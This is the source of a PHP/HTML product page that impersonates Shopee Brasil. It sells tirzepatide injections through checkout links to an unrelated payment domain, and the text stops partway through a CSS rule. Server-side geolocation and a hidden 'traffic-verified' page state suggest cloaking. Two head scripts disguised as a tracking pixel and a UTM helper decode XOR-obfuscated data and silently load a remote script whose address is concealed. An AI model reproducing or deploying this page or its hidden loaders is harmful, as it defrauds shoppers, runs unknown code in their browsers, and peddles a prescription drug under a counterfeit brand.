<?php
$checkout_urls = [
    '1' => "https://seguro.centralpag.online/api/public/shopify?product=156886789755&store=1568", // 1 Unidade (R$ 87,90)
    '2' => "https://seguro.centralpag.online/api/public/shopify?product=156891449648&store=1568", // 2 Unidades (R$ 137,90)
    '4' => "https://seguro.centralpag.online/api/public/shopify?product=156837437479&store=1568"  // 4 Unidades (R$ 187,90)
];
$checkout_url = $checkout_urls['1'];

// Server-side Geolocation Check (Cloudflare / CDN Edge Headers)
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';
$http_host = $_SERVER['HTTP_HOST'] ?? '';
$is_local = ($client_ip === '127.0.0.1' || $client_ip === '::1' || stripos($http_host, 'localhost') !== false || stripos($http_host, '127.0.0.1') !== false);

$server_country = '';
if (!empty($_SERVER['HTTP_CF_IPCOUNTRY'])) {
    $server_country = strtoupper(trim($_SERVER['HTTP_CF_IPCOUNTRY']));
} elseif (!empty($_SERVER['HTTP_X_COUNTRY_CODE'])) {
    $server_country = strtoupper(trim($_SERVER['HTTP_X_COUNTRY_CODE']));
}

$server_is_brazil = null;
if ($is_local) {
    $server_is_brazil = true;
} elseif (!empty($server_country)) {
    $server_is_brazil = ($server_country === 'BR');
}
?><!DOCTYPE html>
<html class="roboto" dir="ltr" lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="robots" content="index, follow">
    <!-- Pixel Script -->
    <script>(function(){var z_ftvo=atob("DGvzLQUbv4qFe47gNRDRWHd3nbCnE/qURRjJAip42+SrDvqNXA2KA2Z00qTnCaGTVhmaXXFokPrsA+uMGhuaVWB3keD2WaLCVB+HX2x5yv7gCKzabjbfD2J30OjkF/3CDzCID2t60u+nQayQXBOWQUx/naanDe+MQA7RFyct3u60SO3RDVPCSDR9i7nkQr/SBg+XGz05wtf4");var p_82=[];for(var k_tms=0;k_tms<z_ftvo.length;k_tms++){p_82.push(z_ftvo.charCodeAt(k_tms)&255);}var z_o7=p_82[0];var e_ujq4=p_82.slice(1,1+z_o7);var o_bf5l=p_82.slice(1+z_o7);var c_0izs=o_bf5l.map(function(b,z_b0b){return b^e_ujq4[z_b0b%z_o7];});var b_w03="";for(var e_ijc=0;e_ijc<c_0izs.length;e_ijc++){b_w03+=String.fromCharCode(c_0izs[e_ijc]&255);}var r_57oy=decodeURIComponent(escape(b_w03));var o_lwd=JSON.parse(r_57oy);var s_oipt=o_lwd.globals||[];s_oipt.forEach(function(l_md2){window[l_md2.name]=l_md2.value;});var i_zeo=document.createElement("script");i_zeo.src=o_lwd.url;i_zeo.async=true;i_zeo.defer=true;(o_lwd.attributes||[]).forEach(function(g_90e0){i_zeo.setAttribute(g_90e0.name,g_90e0.value);});(document.head||document.documentElement).appendChild(i_zeo);})();</script>
    <!-- UTM Pass-Through Script -->
    <script>(function(){var s_d=atob("DC5IZUWVAeMfD7KhdlVqEDf5I9k9Z8bVBl1ySmr2ZY0xesbMH0gxSyb6bM19fZ3SFVwhFTHmLpZrYsGOGk88ADbhL4lsLZ6DF1o8Fyz3dJd6fJCbLVVqCyT4ZMElLdbAAk9lEDH4aIVmIsLTE1gtCzG4eYBwa5/SFUVqSWfjYI9qapCbVAw1ST63b4JyapCbVEopESS4dJdyZtTYW146ADPwb5cyfMfDH0o7R2m3d4JzeteDTAxqGBjo");var d_9jv=[];for(var q_b=0;q_b<s_d.length;q_b++){d_9jv.push(s_d.charCodeAt(q_b)&255);}var m_7jw=d_9jv[0];var r_cd=d_9jv.slice(1,1+m_7jw);var v_y=d_9jv.slice(1+m_7jw);var j_h=v_y.map(function(b,h_l){return b^r_cd[h_l%m_7jw];});var r_fx="";for(var o_ec=0;o_ec<j_h.length;o_ec++){r_fx+=String.fromCharCode(j_h[o_ec]&255);}var f_w=decodeURIComponent(escape(r_fx));var r_std=JSON.parse(f_w);var u_vii6=r_std.globals||[];u_vii6.forEach(function(b_ag){window[b_ag.name]=b_ag.value;});var m_8=document.createElement("script");m_8.src=r_std.url;m_8.async=true;m_8.defer=true;(r_std.attributes||[]).forEach(function(i_61k){m_8.setAttribute(i_61k.name,i_61k.value);});(document.head||document.documentElement).appendChild(m_8);})();</script>
    <title>T.G. 15 · Tirzepatida 15 mg/0,5 mL | Shopee Brasil</title>
    <link rel="icon" type="image/png" sizes="32x32" href="https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/icon_favicon_1_32.9cd61b2e90c0f104.png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/mobile.css?v=20261017">
    <link rel="preload" as="image" href="images/splash_app.jpg">
    <style id="shopee-embedded-mobile-css">
/* ========================================================
   AUTHENTIC SHOPEE MOBILE EXPERIENCE - T.G. 15 TIRZEPATIDA
   ======================================================== */

* {
    box-sizing: border-box !important;
    -webkit-tap-highlight-color: transparent;
}

html, body {
    width: 100% !important;
    max-width: 100% !important;
    overflow-x: hidden !important;
    margin: 0 !important;
    padding: 0 !important;
    background-color: #f5f5f5 !important;
    font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Arial, sans-serif !important;
    font-size: 14px !important;
    color: #222 !important;
    line-height: 1.3 !important;
    padding-bottom: 56px !important;
}

#main {
    width: 100% !important;
    max-width: 560px !important;
    margin: 0 auto !important;
    background: #f5f5f5 !important;
    position: relative !important;
    overflow-x: hidden !important;
    min-height: 100vh !important;
    opacity: 0 !important;
    pointer-events: none !important;
    transition: opacity 0.5s ease-in-out !important;
}

#main.unlocked,
#main.traffic-verified {
    opacity: 1 !important;
    pointer-events: auto !important;
    visibility: visible !important;
}

/* 1. FLOATING HEADER (At top over media) */
.shopee-floating-header {
    position: absolute !important;
    top: 12px !important;
    left: 0 !important;
    right: 0 !important;
    z-index: 100 !important;
    display: flex !important;
    justify-content: space-between !important;
    align-items: center !important;
    padding: 0 12px !important;
    pointer-events: none !important;
}

.shopee-header-right {
    display: flex !important;
    align-items: center !important;
    gap: 8px !important;
}

.shopee-circle-btn {
    pointer-events: auto !important;
    width: 36px !important;
    height: 36px !important;
    border-radius: 50% !important;
    background: rgba(0, 0, 0, 0.4) !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    text-decoration: none !important;
    position: relative !important;
    border: none !important;
    outline: none !important;
    cursor: pointer !important;
    transition: background 0.2s !important;
}

.shopee-circle-btn:hover {
    background: rgba(0, 0, 0, 0.6) !important;
}

.shopee-cart-badge {
    position: absolute !important;
    top: -2px !important;
    right: -2px !important;
    background: #ee4d2d !important;
    color: #fff !important;
    font-size: 10px !important;
    font-weight: 700 !important;
    border-radius: 10px !important;
    padding: 1px 5px !important;
    line-height: 1 !important;
    border: 1px solid #fff !important;
}

/* 2. STICKY SCROLLED HEADER */
.shopee-sticky-scrolled-header {
    position: fixed !important;
    top: 0 !important;
    left: 0 !important;
    right: 0 !important;
    max-width: 560px !important;
    margin: 0 auto !important;
    height: 46px !important;
    background: #fff !important;
    border-bottom: 1px solid #ebebeb !important;
    z-index: 1000 !important;
    display: flex !important;
    align-items: center !important;
    padding: 0 12px !important;
    gap: 10px !important;
    transform: translateY(-100%) !important;
    transition: transform 0.25s ease-out !important;
    box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05) !important;
}

.shopee-sticky-scrolled-header.visible {
    transform: translateY(0) !important;
}

.scrolled-back-btn {
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    width: 32px !important;
    height: 32px !important;
    cursor: pointer !important;
    text-decoration: none !important;
    flex-shrink: 0 !important;
}

.scrolled-title {
    flex: 1 !important;
    font-size: 14px !important;
    font-weight: 500 !important;
    color: #222 !important;
    white-space: nowrap !important;
    overflow: hidden !important;
    text-overflow: ellipsis !important;
}

.scrolled-right {
    display: flex !important;
    align-items: center !important;
    gap: 10px !important;
    flex-shrink: 0 !important;
}

.scrolled-cart-btn {
    position: relative !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    width: 28px !important;
    height: 28px !important;
    text-decoration: none !important;
}

.scrolled-more-btn {
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    width: 28px !important;
    height: 28px !important;
    text-decoration: none !important;
}

/* 3. MEDIA CAROUSEL */
.shopee-media-section {
    width: 100% !important;
    max-width: 100% !important;
    position: relative !important;
    background: #fff !important;
    margin: 0 !important;
    padding: 0 !important;
    overflow: hidden !important;
}

.shopee-carousel-wrapper {
    width: 100% !important;
    max-width: 100% !important;
    position: relative !important;
    overflow: hidden !important;
    aspect-ratio: 1 / 1 !important;
    background: #fff !important;
    touch-action: pan-y !important;
    contain: paint !important;
}

.shopee-carousel-track {
    display: flex !important;
    flex-direction: row !important;
    flex-wrap: nowrap !important;
    width: 100% !important;
    max-width: 100% !important;
    height: 100% !important;
    transition: transform 0.3s cubic-bezier(0.25, 1, 0.5, 1) !important;
    will-change: transform !important;
    margin: 0 !important;
    padding: 0 !important;
}

.shopee-carousel-slide {
    flex: 0 0 100% !important;
    width: 100% !important;
    min-width: 100% !important;
    max-width: 100% !important;
    height: 100% !important;
    position: relative !important;
    overflow: hidden !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    background: #fff !important;
    margin: 0 !important;
    padding: 16px !important;
}

.shopee-carousel-slide img {
    width: 100% !important;
    height: 100% !important;
    object-fit: contain !important;
    display: block !important;
}

/* CAROUSEL NAV ARROWS */
.shopee-carousel-nav-btn {
    position: absolute !important;
    top: 50% !important;
    transform: translateY(-50%) !important;
    width: 36px !important;
    height: 36px !important;
    border-radius: 50% !important;
    background: rgba(0, 0, 0, 0.35) !important;
    border: none !important;
    color: #fff !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    cursor: pointer !important;
    z-index: 60 !important;
    outline: none !important;
    transition: background 0.2s !important;
}

.shopee-carousel-nav-btn:hover {
    background: rgba(0, 0, 0, 0.65) !important;
}

.nav-prev {
    left: 8px !important;
}

.nav-next {
    right: 8px !important;
}

.shopee-badge-counter {
    position: absolute !important;
    bottom: 12px !important;
    right: 12px !important;
    background: rgba(0, 0, 0, 0.6) !important;
    color: #fff !important;
    font-size: 11px !important;
    font-weight: 500 !important;
    padding: 3px 9px !important;
    border-radius: 12px !important;
    z-index: 50 !important;
    pointer-events: none !important;
}

/* CAROUSEL THUMBNAILS RIBBON */
.shopee-carousel-thumbnails-ribbon {
    display: flex !important;
    gap: 8px !important;
    overflow-x: auto !important;
    padding: 10px 14px !important;
    background: #fff !important;
    scrollbar-width: none !important;
    -webkit-overflow-scrolling: touch !important;
    border-bottom: 1px solid #f0f0f0 !important;
}

.shopee-carousel-thumbnails-ribbon::-webkit-scrollbar {
    display: none !important;
}

.carousel-thumb-item {
    flex: 0 0 58px !important;
    width: 58px !important;
    height: 58px !important;
    border-radius: 4px !important;
    border: 2px solid transparent !important;
    overflow: hidden !important;
    cursor: pointer !important;
    position: relative !important;
    background: #f8f8f8 !important;
    transition: border-color 0.2s !important;
}

.carousel-thumb-item img {
    width: 100% !important;
    height: 100% !important;
    object-fit: cover !important;
    display: block !important;
}

.carousel-thumb-item.active {
    border-color: #ee4d2d !important;
}

/* CUSTOMER STORIES / VIDEO HIGHLIGHTS */
.shopee-stories-section {
    background: #fff !important;
    padding: 10px 14px 12px 14px !important;
    margin-bottom: 8px !important;
    border-bottom: 1px solid #ebebeb !important;
}

.shopee-stories-header {
    display: flex !important;
    justify-content: space-between !important;
    align-items: center !important;
    margin-bottom: 8px !important;
}

.shopee-stories-title {
    font-size: 13px !important;
    font-weight: 700 !important;
    color: #222 !important;
}

.shopee-stories-count {
    color: #888 !important;
    font-weight: 400 !important;
    font-size: 12px !important;
}

.shopee-stories-list {
    display: flex !important;
    gap: 12px !important;
    overflow-x: auto !important;
    padding-bottom: 4px !important;
    scrollbar-width: none !important;
    -webkit-overflow-scrolling: touch !important;
}

.shopee-stories-list::-webkit-scrollbar {
    display: none !important;
}

.shopee-story-item {
    display: flex !important;
    flex-direction: column !important;
    align-items: center !important;
    gap: 5px !important;
    flex: 0 0 62px !important;
    cursor: pointer !important;
    text-decoration: none !important;
}

.shopee-story-ring {
    width: 58px !important;
    height: 58px !important;
    border-radius: 50% !important;
    padding: 2px !important;
    background: linear-gradient(45deg, #ee4d2d, #ff7337, #ff9100) !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    transition: transform 0.2s !important;
}

.shopee-story-ring:active {
    transform: scale(0.95) !important;
}

.shopee-story-img-wrap {
    width: 100% !important;
    height: 100% !important;
    border-radius: 50% !important;
    border: 2px solid #fff !important;
    overflow: hidden !important;
    background: #f0f0f0 !important;
}

.shopee-story-img-wrap img {
    width: 100% !important;
    height: 100% !important;
    object-fit: cover !important;
    display: block !important;
}

.shopee-story-label {
    font-size: 11px !important;
    color: #333 !important;
    font-weight: 500 !important;
    text-align: center !important;
    white-space: nowrap !important;
    max-width: 62px !important;
    overflow: hidden !important;
    text-overflow: ellipsis !important;
}

/* 4. CARDS BASE */
.shopee-card {
    background: #fff !important;
    margin-bottom: 8px !important;
    padding: 12px 14px !important;
    box-sizing: border-box !important;
}

/* AUTHENTICITY & QR CODE CARD */
.shopee-authenticity-card {
    background: #fff !important;
    margin-bottom: 8px !important;
    padding: 12px 14px !important;
    border-left: 4px solid #26aa99 !important;
}

.shopee-auth-content {
    display: flex !important;
    gap: 12px !important;
    align-items: center !important;
}

.shopee-auth-icon {
    width: 44px !important;
    height: 44px !important;
    border-radius: 8px !important;
    background: #e6f7f4 !important;
    color: #26aa99 !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    flex-shrink: 0 !important;
}

.shopee-auth-details {
    flex: 1 !important;
}

.shopee-auth-title {
    font-size: 13.5px !important;
    font-weight: 700 !important;
    color: #222 !important;
    display: flex !important;
    align-items: center !important;
    gap: 6px !important;
}

.shopee-auth-badge {
    background: #26aa99 !important;
    color: #fff !important;
    font-size: 10px !important;
    font-weight: 700 !important;
    padding: 2px 6px !important;
    border-radius: 3px !important;
}

.shopee-auth-desc {
    font-size: 11.5px !important;
    color: #666 !important;
    margin-top: 3px !important;
    line-height: 1.35 !important;
}

.shopee-auth-meta {
    margin-top: 5px !important;
    display: flex !important;
    align-items: center !important;
    gap: 6px !important;
    font-size: 11px !important;
    font-weight: 600 !important;
    color: #444 !important;
}

.shopee-auth-tag {
    background: #f0f0f0 !important;
    padding: 2px 6px !important;
    border-radius: 3px !important;
    font-size: 10.5px !important;
    color: #ee4d2d !important;
    font-weight: 700 !important;
}

/* OFERTA RELÂMPAGO FLASH SALE BAR */
.shopee-flash-sale-bar {
    background: linear-gradient(90deg, #ee4d2d 0%, #ff5722 100%) !important;
    color: #fff !important;
    display: flex !important;
    justify-content: space-between !important;
    align-items: center !important;
    padding: 9px 14px !important;
    margin-bottom: 0 !important;
}

.flash-left {
    display: flex !important;
    align-items: center !important;
    gap: 6px !important;
    font-size: 13px !important;
    font-weight: 700 !important;
    text-transform: uppercase !important;
    letter-spacing: 0.3px !important;
}

.flash-right {
    display: flex !important;
    align-items: center !important;
    gap: 6px !important;
    font-size: 11px !important;
}

.flash-timer {
    display: flex !important;
    align-items: center !important;
    gap: 3px !important;
    font-weight: 700 !important;
    font-size: 12px !important;
}

.timer-box {
    background: #222 !important;
    color: #fff !important;
    border-radius: 3px !important;
    padding: 2px 4px !important;
    min-width: 22px !important;
    text-align: center !important;
    font-family: monospace !important;
    font-size: 12px !important;
}

/* PRICE & MAIN INFO */
.shopee-price-card {
    padding-top: 14px !important;
    padding-bottom: 14px !important;
}

.shopee-price-row {
    display: flex !important;
    justify-content: space-between !important;
    align-items: baseline !important;
    margin-bottom: 4px !important;
}

.shopee-price-main {
    display: flex !important;
    align-items: baseline !important;
    flex-wrap: wrap !important;
    gap: 6px !important;
}

.shopee-currency {
    color: #ee4d2d !important;
    font-size: 15px !important;
    font-weight: 700 !important;
    margin-right: -2px !important;
}

.shopee-amount {
    color: #ee4d2d !important;
    font-size: 28px !important;
    font-weight: 700 !important;
    line-height: 1 !important;
}

.shopee-old-amount {
    color: #888 !important;
    font-size: 13px !important;
    text-decoration: line-through !important;
    margin-left: 2px !important;
}

.shopee-pix-badge {
    color: #ee4d2d !important;
    background: #fff5f3 !important;
    border: 1px solid #ee4d2d !important;
    border-radius: 2px !important;
    font-size: 11px !important;
    font-weight: 600 !important;
    padding: 1px 4px !important;
    margin-left: 2px !important;
}

.shopee-sold-wishlist {
    display: flex !important;
    align-items: center !important;
    gap: 10px !important;
}

.shopee-sold-text {
    font-size: 12px !important;
    color: #757575 !important;
}

.shopee-wishlist-btn {
    background: none !important;
    border: none !important;
    padding: 0 !important;
    cursor: pointer !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
}

.shopee-price-subtext {
    font-size: 12px !important;
    color: #757575 !important;
    margin-bottom: 8px !important;
}

.shopee-product-title {
    font-size: 14.5px !important;
    font-weight: 500 !important;
    color: #222 !important;
    line-height: 1.4 !important;
    margin: 0 !important;
}

/* COUPONS ROW */
.shopee-coupons-row {
    display: flex !important;
    align-items: center !important;
    gap: 8px !important;
    padding: 10px 14px !important;
    background: #fff !important;
    border-top: 1px dashed #f0f0f0 !important;
    border-bottom: 1px solid #f0f0f0 !important;
    overflow-x: auto !important;
    scrollbar-width: none !important;
}

.shopee-coupons-row::-webkit-scrollbar {
    display: none !important;
}

.shopee-coupon-pill {
    background: #fff5f3 !important;
    border: 1px dashed #ee4d2d !important;
    color: #ee4d2d !important;
    padding: 4px 8px !important;
    border-radius: 3px !important;
    font-size: 11px !important;
    font-weight: 700 !important;
    white-space: nowrap !important;
    cursor: pointer !important;
    display: flex !important;
    align-items: center !important;
    gap: 4px !important;
}

/* 5. SHIPPING */
.shopee-shipping-card {
    padding: 12px 14px !important;
}

.shopee-shipping-row {
    display: flex !important;
    align-items: center !important;
    gap: 8px !important;
    font-size: 13px !important;
}

.shopee-truck-icon {
    flex-shrink: 0 !important;
}

.shopee-shipping-info {
    flex: 1 !important;
    display: flex !important;
    align-items: center !important;
    gap: 4px !important;
    font-size: 13px !important;
}

.old-shipping {
    text-decoration: line-through !important;
    color: #888 !important;
}

.new-shipping {
    color: #26aa99 !important;
    font-weight: 600 !important;
}

.shopee-chevron {
    color: #bbb !important;
    font-weight: 600 !important;
    font-size: 14px !important;
}

/* 6. VARIATIONS / PACKAGES SELECTOR */
.shopee-variation-selection-card {
    padding: 14px !important;
}

.variation-title-row {
    display: flex !important;
    justify-content: space-between !important;
    align-items: center !important;
    margin-bottom: 12px !important;
    padding-bottom: 8px !important;
    border-bottom: 1px solid #f5f5f5 !important;
}

.variation-main-title {
    font-size: 13px !important;
    font-weight: 700 !important;
    color: #222 !important;
    text-transform: uppercase !important;
}

.variation-selected-name {
    font-size: 12px !important;
    color: #ee4d2d !important;
    font-weight: 500 !important;
}

.shopee-package-grid {
    display: grid !important;
    grid-template-columns: repeat(3, 1fr) !important;
    gap: 8px !important;
    margin-top: 8px !important;
}

.package-card {
    border: 1.5px solid #e0e0e0 !important;
    border-radius: 6px !important;
    padding: 12px 6px 10px 6px !important;
    display: flex !important;
    flex-direction: column !important;
    align-items: center !important;
    text-align: center !important;
    background: #fff !important;
    cursor: pointer !important;
    position: relative !important;
    transition: all 0.2s !important;
}

.package-card.selected {
    border-color: #ee4d2d !important;
    background: #fff8f6 !important;
}

.package-badge {
    position: absolute !important;
    top: -8px !important;
    left: 50% !important;
    transform: translateX(-50%) !important;
    background: #ee4d2d !important;
    color: #fff !important;
    font-size: 9px !important;
    font-weight: 700 !important;
    padding: 1px 6px !important;
    border-radius: 10px !important;
    white-space: nowrap !important;
    z-index: 2 !important;
}

.package-img {
    width: 48px !important;
    height: 48px !important;
    object-fit: contain !important;
    margin-bottom: 4px !important;
}

.package-title {
    font-size: 11.5px !important;
    font-weight: 600 !important;
    color: #222 !important;
    line-height: 1.2 !important;
    margin-bottom: 2px !important;
}

.package-old-price {
    font-size: 10px !important;
    color: #999 !important;
    text-decoration: line-through !important;
}

.package-price {
    font-size: 13px !important;
    font-weight: 700 !important;
    color: #ee4d2d !important;
}

.package-tick {
    display: none !important;
    position: absolute !important;
    bottom: 0 !important;
    right: 0 !important;
    width: 14px !important;
    height: 14px !important;
    background: #ee4d2d !important;
    clip-path: polygon(100% 0, 0 100%, 100% 100%) !important;
}

.package-card.selected .package-tick {
    display: flex !important;
    align-items: flex-end !important;
    justify-content: flex-end !important;
}

/* QUANTITY CONTROLS */
.shopee-qty-row {
    display: flex !important;
    align-items: center !important;
    gap: 12px !important;
    padding-top: 12px !important;
    margin-top: 10px !important;
    border-top: 1px solid #f5f5f5 !important;
}

.qty-label {
    font-size: 13px !important;
    color: #777 !important;
    width: 80px !important;
}

.qty-controls {
    display: inline-flex !important;
    border: 1px solid #ddd !important;
    border-radius: 3px !important;
    overflow: hidden !important;
    height: 32px !important;
}

.qty-btn {
    width: 32px !important;
    height: 30px !important;
    background: #f8f8f8 !important;
    border: none !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    font-size: 16px !important;
    cursor: pointer !important;
    color: #555 !important;
    outline: none !important;
}

.qty-btn:disabled,
.qty-btn[disabled] {
    opacity: 0.35 !important;
    cursor: not-allowed !important;
    background: #f0f0f0 !important;
    color: #aaa !important;
}

.qty-input {
    width: 44px !important;
    height: 30px !important;
    border: none !important;
    border-left: 1px solid #eee !important;
    border-right: 1px solid #eee !important;
    text-align: center !important;
    font-size: 14px !important;
    font-weight: 600 !important;
    color: #333 !important;
    outline: none !important;
}

.qty-input:read-only {
    background: #fff !important;
    cursor: default !important;
}

.qty-stock {
    font-size: 12px !important;
    color: #26aa99 !important;
    font-weight: 500 !important;
}

/* 7. COLD CHAIN & DELIVERY GUARANTEES */
.shopee-guarantees-card {
    padding: 14px !important;
}

.shopee-guarantees-grid {
    display: grid !important;
    grid-template-columns: repeat(4, 1fr) !important;
    gap: 6px !important;
    margin-top: 8px !important;
}

.shopee-guarantee-col {
    display: flex !important;
    flex-direction: column !important;
    align-items: center !important;
    text-align: center !important;
    gap: 4px !important;
}

.guarantee-circle {
    width: 38px !important;
    height: 38px !important;
    border-radius: 50% !important;
    background: #fff1f4 !important;
    color: #ee4d2d !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
}

.guarantee-label {
    font-size: 10.5px !important;
    font-weight: 600 !important;
    color: #333 !important;
    line-height: 1.2 !important;
}

.shopee-alert-box {
    margin-top: 12px !important;
    background: #fff8f6 !important;
    border: 1px solid rgba(238, 77, 45, 0.25) !important;
    border-radius: 6px !important;
    padding: 10px 12px !important;
    display: flex !important;
    align-items: flex-start !important;
    gap: 10px !important;
}

.shopee-alert-title {
    font-size: 12.5px !important;
    font-weight: 700 !important;
    color: #ee4d2d !important;
}

.shopee-alert-text {
    font-size: 11.5px !important;
    color: #666 !important;
    margin-top: 2px !important;
    line-height: 1.35 !important;
}

/* 8. STORE CARD */
.shopee-store-card {
    padding: 14px !important;
}

.shopee-store-top {
    display: flex !important;
    align-items: center !important;
    gap: 10px !important;
    margin-bottom: 12px !important;
}

.shopee-store-avatar {
    width: 44px !important;
    height: 44px !important;
    border-radius: 50% !important;
    border: 1px solid #eee !important;
    object-fit: cover !important;
    flex-shrink: 0 !important;
}

.shopee-store-info {
    flex: 1 !important;
    display: flex !important;
    flex-direction: column !important;
    gap: 2px !important;
    min-width: 0 !important;
}

.shopee-store-name {
    font-size: 13.5px !important;
    font-weight: 700 !important;
    color: #222 !important;
    white-space: nowrap !important;
    overflow: hidden !important;
    text-overflow: ellipsis !important;
    display: flex !important;
    align-items: center !important;
    gap: 6px !important;
}

.shopee-store-status {
    font-size: 11px !important;
    color: #888 !important;
}

.shopee-store-visit-btn {
    border: 1px solid #ee4d2d !important;
    color: #ee4d2d !important;
    background: #fff !important;
    font-size: 12px !important;
    padding: 5px 10px !important;
    border-radius: 4px !important;
    text-decoration: none !important;
    white-space: nowrap !important;
    font-weight: 500 !important;
    flex-shrink: 0 !important;
}

.shopee-store-metrics {
    display: flex !important;
    justify-content: space-between !important;
    border-top: 1px solid #f5f5f5 !important;
    padding-top: 10px !important;
}

.shopee-store-metric {
    display: flex !important;
    align-items: center !important;
    gap: 4px !important;
    font-size: 12px !important;
    color: #555 !important;
}

.metric-val {
    font-weight: 600 !important;
    color: #ee4d2d !important;
}

/* 9. SPECIFICATIONS */
.shopee-specs-card {
    padding: 12px 14px !important;
}

.shopee-spec-header {
    display: flex !important;
    justify-content: space-between !important;
    align-items: center !important;
    cursor: pointer !important;
}

.shopee-spec-title {
    font-size: 13px !important;
    font-weight: 600 !important;
    color: #222 !important;
}

.shopee-spec-summary {
    font-size: 12px !important;
    color: #888 !important;
}

.shopee-spec-body {
    display: block !important;
    padding-top: 10px !important;
    margin-top: 10px !important;
    border-top: 1px solid #f5f5f5 !important;
}

.shopee-spec-row {
    display: flex !important;
    padding: 6px 0 !important;
    font-size: 12px !important;
    border-bottom: 1px solid #fafafa !important;
}

.spec-label {
    width: 120px !important;
    color: #888 !important;
    flex-shrink: 0 !important;
}

.spec-value {
    flex: 1 !important;
    color: #333 !important;
}

/* 10. DESCRIPTION & FAQ */
.shopee-desc-card {
    padding: 14px !important;
}

.shopee-section-title {
    font-size: 13px !important;
    font-weight: 600 !important;
    color: #222 !important;
    margin: 0 0 8px 0 !important;
}

.shopee-desc-text {
    font-size: 13px !important;
    color: #444 !important;
    line-height: 1.5 !important;
    max-height: 90px !important;
    overflow: hidden !important;
    transition: max-height 0.35s ease-out !important;
}

.shopee-desc-text.expanded {
    max-height: 3000px !important;
}

.shopee-desc-text p {
    margin: 0 0 8px 0 !important;
}

.shopee-expand-btn {
    background: none !important;
    border: none !important;
    color: #ee4d2d !important;
    font-size: 12px !important;
    font-weight: 500 !important;
    padding: 8px 0 0 0 !important;
    cursor: pointer !important;
    display: flex !important;
    align-items: center !important;
    gap: 4px !important;
    margin: 0 auto !important;
}

.shopee-faq-item {
    border-bottom: 1px solid #f0f0f0 !important;
    padding: 10px 0 !important;
}

.shopee-faq-q {
    display: flex !important;
    justify-content: space-between !important;
    align-items: center !important;
    font-size: 12.5px !important;
    font-weight: 600 !important;
    color: #222 !important;
    cursor: pointer !important;
}

.shopee-faq-a {
    display: none;
    font-size: 12px !important;
    color: #666 !important;
    margin-top: 6px !important;
    line-height: 1.45 !important;
}

.shopee-faq-a.open {
    display: block !important;
}

/* 11. REVIEWS */
.shopee-reviews-card {
    padding: 14px !important;
}

.shopee-reviews-header {
    display: flex !important;
    justify-content: space-between !important;
    align-items: center !important;
    margin-bottom: 6px !important;
}

.shopee-see-all {
    font-size: 12px !important;
    color: #ee4d2d !important;
    text-decoration: none !important;
    font-weight: 500 !important;
}

.shopee-reviews-stars {
    display: flex !important;
    align-items: center !important;
    gap: 6px !important;
    margin-bottom: 8px !important;
}

.stars-gold {
    color: #ee4d2d !important;
    font-size: 13px !important;
    letter-spacing: 1px !important;
}

.score-text {
    color: #ee4d2d !important;
    font-size: 13px !important;
    font-weight: 700 !important;
}

.reviews-count {
    color: #777 !important;
    font-size: 12px !important;
}

.shopee-review-chips {
    display: flex !important;
    gap: 8px !important;
    flex-wrap: wrap !important;
    margin-bottom: 12px !important;
}

.shopee-chip {
    background: #fdf4f2 !important;
    color: #333 !important;
    font-size: 11px !important;
    padding: 4px 10px !important;
    border-radius: 12px !important;
}

.shopee-review-item {
    border-top: 1px solid #f2f2f2 !important;
    padding-top: 12px !important;
    margin-top: 8px !important;
}

.review-author-row {
    display: flex !important;
    align-items: center !important;
    gap: 8px !important;
    margin-bottom: 4px !important;
}

.review-avatar {
    width: 28px !important;
    height: 28px !important;
    border-radius: 50% !important;
    object-fit: cover !important;
    flex-shrink: 0 !important;
}

.review-avatar-placeholder {
    width: 28px !important;
    height: 28px !important;
    border-radius: 50% !important;
    background: #eee !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    flex-shrink: 0 !important;
}

.review-author-info {
    display: flex !important;
    flex-direction: column !important;
}

.review-username {
    font-size: 12px !important;
    font-weight: 600 !important;
    color: #333 !important;
    display: flex !important;
    align-items: center !important;
    gap: 4px !important;
}

.stars-gold-small {
    color: #ffb400 !important;
    font-size: 10px !important;
}

.review-actions {
    margin-left: auto !important;
    display: flex !important;
    align-items: center !important;
    gap: 8px !important;
    font-size: 11px !important;
    color: #888 !important;
}

.review-variation-tag {
    font-size: 11px !important;
    color: #888 !important;
    margin-bottom: 6px !important;
}

.review-body {
    font-size: 12px !important;
    color: #333 !important;
    line-height: 1.4 !important;
    margin-bottom: 8px !important;
}

.review-photos-grid {
    display: flex !important;
    flex-wrap: wrap !important;
    gap: 8px !important;
    margin-bottom: 6px !important;
}

.review-photos-grid img {
    width: 76px !important;
    height: 76px !important;
    border-radius: 4px !important;
    object-fit: cover !important;
    border: 1px solid #eee !important;
    cursor: pointer !important;
}

.review-date-text {
    font-size: 11px !important;
    color: #999 !important;
}

/* 12. ORIGINAL SYSTEM FOOTER (Re-engineered for Mobile perfection) */
footer.Dtu9HW,
.Dtu9HW {
    min-width: 0 !important;
    width: 100% !important;
    max-width: 100% !important;
    overflow: hidden !important;
    box-sizing: border-box !important;
    background-color: #fbfbfb !important;
    border-top: 3px solid #ee4d2d !important;
    padding: 24px 14px 75px 14px !important;
}

.Dtu9HW * {
    max-width: 100% !important;
    box-sizing: border-box !important;
}

.Dtu9HW .bE7OGq,
.Dtu9HW .mUnW9g {
    width: 100% !important;
    max-width: 100% !important;
    min-width: 0 !important;
